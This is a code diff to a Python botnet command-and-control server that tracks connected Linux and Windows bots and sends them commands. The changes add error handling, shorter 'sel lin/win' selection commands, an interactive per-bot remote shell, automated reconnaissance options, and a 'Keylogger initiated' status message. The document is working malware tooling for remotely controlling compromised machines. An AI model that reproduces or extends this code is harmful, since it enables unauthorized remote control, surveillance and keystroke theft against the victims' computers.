@@ -54,6 +54,7 @@ WINDOWS_RECON_CMDS = ['systeminfo', 'tasklist']
 RESET = '\033[0m'
 BOLD = '\033[01m'
 BLUE = '\033[94m'
+DARKBLUE = '\033[34m'
 GREEN = '\033[92m'
 RED = '\033[91m'
 PURPLE = '\033[95m'
@@ -74,9 +75,13 @@ class Server:
 			Returns:
 				None
 		"""
-		self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-		self.server_socket.bind((IP, PORT))
-		self.server_socket.listen(NUM_OF_CONNECTIONS)
+		try:
+			self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+			self.server_socket.bind((IP, PORT))
+			self.server_socket.listen(NUM_OF_CONNECTIONS)
+		except:
+			print(RED + 'Address already is use. Try again in 10-15 seconds...' + RESET)
+			_exit(1)
 
 	def accept_connections(self):
 		"""
@@ -94,14 +99,21 @@ class Server:
 			conn, addr = self.server_socket.accept()
 			conn.setblocking(1)
 			initial_response = conn.recv(COMMMAND_SIZE).decode('utf-8')
+
 			if initial_response == 'Linux':
-				LINUX_CONNS[addr[0]] = conn
-				LINUX_COUNT += 1
-				IP_ADDRESSES[0].append(addr[0])
+				if addr[0] in LINUX_CONNS.keys():
+					LINUX_CONNS[addr[0]] = conn
+				else:
+					LINUX_CONNS[addr[0]] = conn
+					LINUX_COUNT += 1
+					IP_ADDRESSES[0].append(addr[0])
 			else:
-				WINDOWS_CONNS[addr[0]] = conn
-				WINDOWS_COUNT += 1
-				IP_ADDRESSES[1].append(addr[0])
+				if addr[0] in WINDOWS_CONNS.keys():
+					WINDOWS_CONNS[addr[0]] = conn
+				else:
+					WINDOWS_CONNS[addr[0]] = conn
+					WINDOWS_COUNT += 1
+					IP_ADDRESSES[1].append(addr[0])
 
 	def close(self):
 		"""This function will close all active connections.
@@ -230,13 +242,21 @@ class BotnetCmdCtrl:
 					except:
 						print(RED + 'Couldn\'t run command: ' + RESET + cmd[3:])
 
-			elif cmd[:10] == 'select lin': # Select the Linux target to connect to.
-				index = int(cmd[11:].strip())
-				self.send_cmd_linux_target(index)
+			elif cmd[:7] == 'sel lin': # Select the Linux target to connect to.
+				try:
+					index = int(cmd[8:].strip())
+					self.send_cmd_linux_target(index)
+				except ValueError:
+					print(RED + '[-] Invalid index...' + RESET)
+					continue
 
-			elif cmd[:10] == 'select win': # Select the Windows target to connect to.
-				index = int(cmd[11:].strip())
-				self.send_cmd_windows_target(index)
+			elif cmd[:7] == 'sel win': # Select the Windows target to connect to.
+				try:
+					index = int(cmd[8:].strip())
+					self.send_cmd_windows_target(index)
+				except ValueError:
+					print(RED + '[-] Invalid index...' + RESET)
+					continue
 
 			elif cmd.strip() == 'autorecon linux':
 				b = 0
@@ -346,10 +366,28 @@ class BotnetCmdCtrl:
 			cmd = input(PURPLE + f'[shell][{target_ip}]$: ' + RESET)
 			if cmd == 'back':
 				break
-			conn.send(cmd.encode(ENCODING))
-			resp = conn.recv(BUFFER).decode(ENCODING)
+			elif cmd == 'exit':
+				print(RED, '\nYou have closed all connections. Exiting program...', RESET)
+				self.server.close()
+				_exit(1)
+			elif cmd == 'help':
+				self.help()
+				continue
+			elif cmd == 'clear':
+				system('clear')
+				continue
+
+			try:
+				conn.send(cmd.encode(ENCODING))
+				resp = conn.recv(BUFFER).decode(ENCODING)
+			except BrokenPipeError:
+				print(RED + f'The connection to {target_ip} is no longer available...' + RESET)
+				break
+
 			if resp == 'Invalid command...' or resp == 'Ok':
 				print(RED + resp + RESET)
+			elif resp == 'None':
+				print(DARKBLUE + 'Keylogger initiated...' + RESET)
 			else:
 				resp = resp[2:-1]
 				resp = resp.replace('\\n', '\n')
@@ -377,10 +415,28 @@ class BotnetCmdCtrl:
 			cmd = input(PURPLE + f'[shell][{target_ip}]$: ' + RESET)
 			if cmd == 'back':
 				break
-			conn.send(cmd.encode(ENCODING))
-			resp = conn.recv(BUFFER).decode(ENCODING)
+			elif cmd == 'exit':
+				print(RED, '\nYou have closed all connections. Exiting program...', RESET)
+				self.server.close()
+				_exit(1)
+			elif cmd == 'help':
+				self.help()
+				continue
+			elif cmd == 'clear':
+				system('clear')
+				continue
+
+			try:
+				conn.send(cmd.encode(ENCODING))
+				resp = conn.recv(BUFFER).decode(ENCODING)
+			except BrokenPipeError:
+				print(RED + f'The connection to {target_ip} is no longer available...' + RESET)
+				break
+
 			if resp == 'Invalid command...' or resp == 'Ok':
 				print(RED + resp + RESET)
+			elif resp == 'None':
+				print(DARKBLUE + 'Keylogger initiated...' + RESET)
 			else:
 				resp = resp[2:-1]
 				resp = resp.replace('\\n', '\n')
@@ -431,7 +487,7 @@ class BotnetCmdCtrl:
 		print(ORANGE, '  cnt win >', RESET, 'Lists the amount of Windows connections (int).')
 		print(ORANGE, '  lin [command] >', RESET, 'Send command to all Linux machines.')
 		print(ORANGE, '  win [command] >', RESET, 'Send command to all Windows machines.')
-		print(ORANGE, '  select lin|win [IP index] >', RESET, 'Select number from list outputs and connect to one target.')
+		print(ORANGE, '  sel lin|win [IP index] >', RESET, 'Select number from list outputs and connect to one target.')
 		print(ORANGE, '  switch >', RESET, 'Switch writing modes: to std out, or to stdout and file.')
 		print(ORANGE, '  check mode >', RESET, 'Check write mode.')
 		print(ORANGE, '  autorecon linux >', RESET, 'Performs basic reconnaissance on Linux machines.' )
@@ -460,13 +516,12 @@ class BotnetCmdCtrl:
 
 	def program_info(self):
 		print("""
-██████╗  ██████╗ ████████╗███╗   ██╗███████╗████████╗ ██████╗   ██╗    ██████╗
-██╔══██╗██╔═══██╗╚══██╔══╝████╗  ██║██╔════╝╚══██╔══╝██╔════╝   ██║   ██╔════╝
-██████╔╝██║   ██║   ██║   ██╔██╗ ██║█████╗     ██║   ██║     ████████╗██║     
-██╔══██╗██║   ██║   ██║   ██║╚██╗██║██╔══╝     ██║   ██║     ██╔═██╔═╝██║     
-██████╔╝╚██████╔╝   ██║   ██║ ╚████║███████╗   ██║   ╚██████╗██████║  ╚██████╗
-╚═════╝  ╚═════╝    ╚═╝   ╚═╝  ╚═══╝╚══════╝   ╚═╝    ╚═════╝╚═════╝   ╚═════╝
-
+██████╗ ███████╗██████╗      ██████╗   ██╗    ██████╗
+██╔══██╗██╔════╝██╔══██╗    ██╔════╝   ██║   ██╔════╝
+██████╔╝█████╗  ██║  ██║    ██║     ████████╗██║     
+██╔══██╗██╔══╝  ██║  ██║    ██║     ██╔═██╔═╝██║     
+██║  ██║███████╗██████╔╝    ╚██████╗██████║  ╚██████╗
+╚═╝  ╚═╝╚══════╝╚═════╝      ╚═════╝╚═════╝   ╚═════╝
 By: CHRIS KORTBAOUI, ALEXIS RODRIGUEZ
 """)
 
